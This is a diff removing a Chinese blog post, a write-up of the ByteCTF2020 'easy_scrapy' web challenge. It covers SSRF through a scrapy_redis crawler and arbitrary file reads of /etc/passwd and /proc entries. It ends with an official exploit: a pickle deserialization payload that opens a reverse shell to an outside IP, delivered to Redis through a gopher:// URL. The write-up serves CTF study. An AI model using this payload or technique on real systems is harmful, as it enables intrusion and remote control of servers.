@@ -1,535 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。
- easy_scrapy 考点：MD5爆破、SSRF
-功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：
-import hashlibfor i in range(99999999):if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:print(i)break十几秒能出结果，之后可以BP重放数据包来快速的添加。
-添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。
-监听端口接收到请求：
-GET / HTTP/1.1Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflate发现是scrapy_redis，初步猜测是SSRF打redis。
-既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd
-比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：
-我们可以发现他请求到了我们想要的URL：
-把标签的href改成file协议果然可以造成任意文件读：
-这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。
-在官方文档中找到了这个爬虫框架的结构：
-tutorial/scrapy.cfgtutorial/__init__.pyitems.pypipelines.pysettings.pyspiders/__init__.py...我们尝试去读取这些文件；
-scrapy.cfg:
-# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.'><title>ByteCTF2020复现</title>
-
-<link rel='canonical' href='https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='ByteCTF2020复现'>
-<meta property='og:description' content='这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。
- easy_scrapy 考点：MD5爆破、SSRF
-功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：
-import hashlibfor i in range(99999999):if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:print(i)break十几秒能出结果，之后可以BP重放数据包来快速的添加。
-添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。
-监听端口接收到请求：
-GET / HTTP/1.1Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflate发现是scrapy_redis，初步猜测是SSRF打redis。
-既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd
-比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：
-我们可以发现他请求到了我们想要的URL：
-把标签的href改成file协议果然可以造成任意文件读：
-这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。
-在官方文档中找到了这个爬虫框架的结构：
-tutorial/scrapy.cfgtutorial/__init__.pyitems.pypipelines.pysettings.pyspiders/__init__.py...我们尝试去读取这些文件；
-scrapy.cfg:
-# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.'>
-<meta property='og:url' content='https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
-<meta name="twitter:title" content="ByteCTF2020复现">
-<meta name="twitter:description" content="这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。
- easy_scrapy 考点：MD5爆破、SSRF
-功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：
-import hashlibfor i in range(99999999):if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:print(i)break十几秒能出结果，之后可以BP重放数据包来快速的添加。
-添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。
-监听端口接收到请求：
-GET / HTTP/1.1Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflate发现是scrapy_redis，初步猜测是SSRF打redis。
-既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd
-比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：
-我们可以发现他请求到了我们想要的URL：
-把标签的href改成file协议果然可以造成任意文件读：
-这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。
-在官方文档中找到了这个爬虫框架的结构：
-tutorial/scrapy.cfgtutorial/__init__.pyitems.pypipelines.pysettings.pyspiders/__init__.py...我们尝试去读取这些文件；
-scrapy.cfg:
-# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.">
-    </head>
-    <body class="">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全和代码审计</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>暗色模式</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <div id="article-toolbar">
-        <a href="https://anthem-whisper.github.io/" class="back-home">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="15 6 9 12 15 18" />
-</svg>
-
-
-
-            <span>Back</span>
-        </a>
-    </div>
-
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/p/bytectf2020%E5%A4%8D%E7%8E%B0/">ByteCTF2020复现</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <p>这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。</p>
-<hr>
-<h3 id="easy_scrapy">easy_scrapy</h3>
-<p>考点：MD5爆破、SSRF</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181318.png" alt="img"  /></p>
-<p>功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：</p>
-<pre><code>import hashlib
- 
-for i in range(99999999):
-    if hashlib.md5(str(i).encode('UTF-8')).hexdigest()[:6] == '2c97b3':
-        print(i)
-        break
-</code></pre><p>十几秒能出结果，之后可以BP重放数据包来快速的添加。</p>
-<p>添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。</p>
-<p>监听端口接收到请求：</p>
-<pre><code>GET / HTTP/1.1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en
-User-Agent: scrapy_redis
-Accept-Encoding: gzip, deflate
-</code></pre><p>发现是scrapy_redis，初步猜测是SSRF打redis。</p>
-<p>既然他是爬虫，那么遇到类似于<!-- raw HTML omitted -->这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向<code>file:///etc/passwd</code></p>
-<p>比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个<!-- raw HTML omitted -->标签就会去请求：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181325.png" alt="img"  /></p>
-<p>我们可以发现他请求到了我们想要的URL：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181330.png" alt="img"  /></p>
-<p>把<!-- raw HTML omitted -->标签的href改成file协议果然可以造成任意文件读：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181342.png" alt="img"  /></p>
-<p>这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读<code>/proc/self/environ</code>，得到绝对路径PWD=/code，这个知识点在本站[<a class="link" href="http://wh1sper.com/buuoj%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%953/"  target="_blank" rel="noopener"
-    >SWPU2019]Web3</a>也提到过。</p>
-<p>在<a class="link" href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html"  target="_blank" rel="noopener"
-    >官方文档</a>中找到了这个爬虫框架的结构：</p>
-<pre><code>tutorial/
-    scrapy.cfg
-    tutorial/
-        __init__.py
-        items.py
-        pipelines.py
-        settings.py
-        spiders/
-            __init__.py
-            ...
-</code></pre><p>我们尝试去读取这些文件；</p>
-<p>scrapy.cfg:</p>
-<pre><code># Automatically created by: scrapy startproject
-#
-# For more information about the [deploy] section see:
-# https://scrapyd.readthedocs.io/en/latest/deploy.html
- 
-[settings]
-default = bytectf.settings
- 
-[deploy]
-#url = http://localhost:6800/
-project = bytectf
-</code></pre><p>对照着文档我们可以看到项目文件夹的名称是bytectf，不过在bytectf/spider文件夹下的爬虫名称却似乎是自定义的名字。</p>
-<p>读取<code>/proc/self/cmdline</code>，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。</p>
-<pre><code>/usr/local/bin/python /usr/local/bin/scrapy crawl byte
-</code></pre><p>得知爬虫名字叫做byte。</p>
-<p>读取之，得到<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/ByteCTF2020/bytectf_easy_scrapy.zip"  target="_blank" rel="noopener"
-    >源码</a>，结构大概如下：</p>
-<pre><code>/code/
-  requirement.txt
-  scrapy.cfg
-  bytectf/
-    __init__.py 
-    items.py 
-    pipelines.py 
-    settings.py 
-    spiders/ 
-      __init__.py 
-      byte.py
-</code></pre><p>由源码可知：</p>
-<pre><code>172.20.0.8:6379为内网Redis
-172.20.0.7:27017为mongodb
-</code></pre><p>打一通之后没有任何回显，甚至不能确定这两个主机是否存活。</p>
-<p>根据hint，得到源码之后我们可以本地起一个环境来调试，同时，从<a class="link" href="https://blog.csdn.net/zwq912318834/article/details/78854571"  target="_blank" rel="noopener"
-    >这篇文章</a>里面我们得知redis-scrapy的运作方式:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181356.png" alt="img"  /></p>
-<p>作为一个分布式爬虫，是需要有一个Master端（核心服务器）的，在Master端，会搭建一个Redis数据库，用来存储start_urls、request、items。Master的职责是负责url指纹判重，Request的分配，以及数据的存储（一般在Master端会安装一个mongodb用来存储redis中的items）。出了Master之外，还有一个角色就是slaver（爬虫程序执行端），它主要负责执行爬虫程序爬取数据，并将爬取过程中新的Request提交到Master的redis数据库中。</p>
-<p>这和我们之前的猜想SSRF+Redis是越来越接近的。</p>
-<p>但是用用爬虫去打Redis是打不到东西的，我们可以在源码里面看到scrapy.Request，他是不支持gopher和dict协议的。</p>
-<p>哪里还有SSRF的点呢？</p>
-<p>当然是在点击爬取链接的时候：</p>
-<pre><code>?url=https://baidu.com
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181407.png" alt="img"  /></p>
-<p>监听到请求的UA是<code>PycURL</code>，这个东西和curl差不多，是支持gopher等协议的，我们就可以利用这里去打redis。</p>
-<p>不过遗憾的是，这里的是ssrf仍然是没有回显，难以判断我们的payload是否起作用。</p>
-<p>此题最难发现的点我感觉就是这个pickle反序列化，此时有两种发现pickle反序列化的方法：</p>
-<p>1.本地起一个scrapy_redis环境，去看redis里面的东西，发现序列化数据（操作有难度，也许会遇到很多问题）</p>
-<p>2.爬虫第4行使用了scrapy_redis库，去看这个的源码，可以发现它在存取数据的过程中使用了pickle的序列化方式，并且还可以发现，它会将request对象存入<code>爬虫名:requests</code>这样的有序列表中。</p>
-<p>既然有序列化那必然存在反序列化，利用反序列化来反弹shell。</p>
-<p><code>byte:requests</code>有序列表是zset的，我们gopher打的时候需要zset。</p>
-<p>贴一个官方exp：</p>
-<pre><code>import pickle
-import os
-from urllib.parse import quote
-class exp(object):
-    def __reduce__(self):
-        s = &quot;&quot;&quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;119.45.184.10&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&quot;&quot;&quot;
-        return (os.system, (s,))
-test = str(pickle.dumps(exp()))
-poc = test.replace(&quot;\n&quot;,'\\n').replace(&quot;\&quot;&quot;,&quot;\\\&quot;&quot;)[2:-1]
-poc ='gopher://172.20.0.7:6379/_'+quote('ZADD byte:requests 0 &quot;')+quote(poc)+quote('&quot;')
-print(poc)
-</code></pre><p>时间显得有点急，这道题就草草的复现了一遍，以后时间再本地深究</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-    <aside class="related-contents--wrapper">
-    
-    
-</aside>
-
-
-    
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2020 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
